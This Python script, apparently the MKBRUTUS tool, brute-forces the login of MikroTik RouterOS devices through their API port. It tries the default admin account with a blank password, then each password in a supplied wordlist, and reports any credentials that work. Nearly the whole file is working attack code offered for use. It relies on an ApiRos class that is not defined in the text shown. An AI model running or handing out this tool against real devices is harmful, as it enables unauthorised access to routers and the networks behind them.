# -*- coding: utf-8 -*-

"""
MKBRUTUS - Password bruteforcer for MikroTik devices or boxes running RouterOS

Usage:
    mkbr.py [options] <TARGET> <DICT>
    mkbr.py -h | --help
    mkbr.py --version

Options:
    -h --help,         Show this screen.
    --version,         Show version.
    -p, --port=<port>  RouterOS port [default: 8728]
    -u --user=<user>,  User name [default: admin].
    -s --seconds=<s>   Delay seconds between retry attempts [default: 1]
    -q, --quiet        Quiet mode.
"""

from docopt import docopt
import sys
import binascii
import select
import socket
import time
import signal
import codecs


def error(err):
    print(err)
    print("Try 'mkbrutus.py -h' or 'mkbrutus.py --help' for more information.")


def signal_handler(signal, frame):
    print(" Aborted by user. Exiting... ")
    sys.exit(2)


def run(pwd_num):
    run_time = "%.1f" % (time.time() - t)
    status = "Elapsed Time: %s sec | Passwords Tried: %s" % (run_time, pwd_num)
    bar = "_" * len(status)
    print(bar)
    print(status + "\n")


def main(args):

    print("[*] Starting bruteforce attack...")
    print("-" * 33)

    # Catch KeyboardInterrupt
    signal.signal(signal.SIGINT, signal_handler)

    # Looking for default RouterOS creds
    defcredcheck = True

    # Get the number of lines in file
    count = 0
    dictFile = codecs.open(args['<DICT>'],'rb', encoding='utf-8', errors='ignore')
    while 1:
        buffer = dictFile.read(8192*1024)
        if not buffer: break
        count += buffer.count('\n')
    dictFile.seek(0)

    items = 1
    for password in dictFile.readlines():
        password = password.strip('\n\r ')
        s = None
        for res in socket.getaddrinfo(args['<TARGET>'], args['--port'], socket.AF_UNSPEC, socket.SOCK_STREAM):
            af, socktype, proto, canonname, sa = res
            try:
                 s = socket.socket(af, socktype, proto)
                 # Timeout threshold = 5 secs
                 s.settimeout(5)
            except (socket.error):
                s = None
                continue
            try:
                 s.connect(sa)
            except (socket.timeout):
                print("[-] Target timed out! Exiting...")
                s.close()
                sys.exit(1)
            except (socket.error):
                print("[-] SOCKET ERROR! Check Target (IP or PORT parameters). Exiting...")
                s.close()
                sys.exit(1)
        dictFile.close(  )
        apiros = ApiRos(s)

        # First of all, we'll try with RouterOS default credentials ("admin":"")
        while defcredcheck:
            defaultcreds = apiros.login("admin", "")
            login = ''.join(defaultcreds[0][0])

            print("[-] Trying with default credentials on RouterOS...")
            print()

            if login == "!done":
                print ("[+] Login successful!!! Default RouterOS credentials were not changed. Log in with admin:<BLANK>")
                sys.exit(0)
            else:
                print("[-] Default RouterOS credentials were unsuccessful, trying with " + str(count) + " passwords in list...")
                print("")
                defcredcheck = False
                time.sleep(1)

        loginoutput = apiros.login(args['--user'], password)
        login = ''.join(loginoutput[0][0])

        if not args['--quiet']:
            print("[-] Trying " + str(items) + " of " + str(count) + " Paswords - Current: " + password)

        if login == "!done":
            print("[+] Login successful!!! User: " + args['--user'] + " Password: " + password)
            run(items)
            return
        items +=1
        time.sleep(int(args['--seconds']))

    print("[*] ATTACK FINISHED! No suitable credentials were found. Try again with a different wordlist.")
    run(count)


if __name__ == '__main__':
    args = docopt(__doc__, version='MKBRUTUS v1.0.2')
    t = time.time()
    main(args)
    sys.exit()
